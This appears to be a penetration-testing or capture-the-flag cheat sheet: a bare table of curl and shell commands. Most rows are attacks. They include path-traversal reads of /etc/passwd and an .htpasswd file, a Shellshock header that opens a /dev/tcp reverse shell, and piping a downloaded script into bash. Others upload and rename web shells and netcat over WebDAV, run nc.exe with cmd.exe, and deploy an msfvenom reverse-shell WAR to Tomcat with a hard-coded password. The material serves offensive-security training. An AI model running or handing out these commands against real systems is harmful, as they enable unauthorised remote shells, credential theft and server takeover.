# Curl Commands

| No. | Command |
|-----|---------|
| 1   | `curl -X POST "$url"` |
| 2   | `curl -X POST "$url" --data "$username=admin&password=admin"` |
| 3   | `curl -X POST "$url" --data "$username=admin&password=admin" -u a` |
| 4   | `curl -X PUT "$url" --data "$username=admin&password=admin"` |
| 5   | `curl -X POST -k "https://$ip:$port/file_view.php" -d "file=../../../../../etc/passwd"` |
| 6   | `curl -X POST -k "https://$ip:$port/file_view.php" -d "file=../../../../../etc/nginx/sites-available/default"` |
| 7   | `curl -X POST -k "https://$ip:$port/file_view.php" -d "file=../../../../../var/www/p4ss/.htapasswd"` |
| 8   | `curl "//$ip:$port/url.php?path=localhost:888/?doc=backup"` |
| 9   | `curl -s $url \| grep -oE "picoCTF{.*}" --color=none` |
| 10  | `curl $ip:8000/LinEnum.sh \| bash` |
| 11  | `curl "$ip/LinEnum.sh" -o LinEnum.sh` |
| 12  | `curl -k "$url" -o "$filename.png"` |
| 13  | `nc -lvp 8008` |
| 14  | `curl -k -H "user-agent: () { :; }; bash -i >& /dev/tcp/$ip/$port 0>&1" "//$targetIP:$port/session_login.cgi"` |
| 15  | `curl -vvv --upload-file cmd.php "$ip/webdav_test_inception/cmd.php" --user "$username:$password"` |
| 16  | `curl "http://$ip/" --upload-file shell.txt` |
| 17  | `curl -X MOVE --header "Destination:http://$ip/shell.aspx" "http://$ip/shell.txt"` |
| 18  | `curl "$ip" --upload-file nc.txt` |
| 19  | `curl -X MOVE --header "Destination:http://$ip/nc.exe" "http://$ip/nc.txt"` |
| 20  | `cmd.exe /c "c:\\Inetpub\\wwwroot\\nc.exe $ip 1337 -e cmd.exe"` |
| 21  | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=53 -f war > ata.war` |
| 22  | `curl -u "tomcat:\$3cureP4s5w0rd123!" --upload-file ata.war "http://$ip:8080/manager/text/deploy?path=/ata"` |
| 23  | `curl -u "tomcat:\$3cureP4s5w0rd123!" "http://$ip:8080/manager/text/list"` |
| 24  | `curl "$ip/centron/api/index.php?action=authenticate" -d 'username=admin&password=password'` |
| 25  | `for i in $(seq 1 20); do echo -n "$i: "; curl -s "http://$ip/index.php/jobs/apply/$i/" \| grep '<title>' ; done` |
| 26  | `for i in $(seq 1 20); do python -c "print('Hello World')"; done` |
| 27  | `curl -X PUT "http://$ip/test.html" -d @test.html` |
| 28  | `curl "http://$ip/test.html"` |
| 29  | `curl -X MOVE --header 'Destination:http://$ip/test.aspx' 'http://$ip/test.html'` |
| 30  | `curl "http://$ip/test.aspx"` |
| 31  | `mv shell.aspx shell.txt` |
| 32  | `curl -X PUT "http://$ip/shell.txt" --data-binary @shell.txt` |
| 33  | `curl -X MOVE --header 'Destination:http://$ip/shell.aspx' 'http://$ip/shell.txt'` |
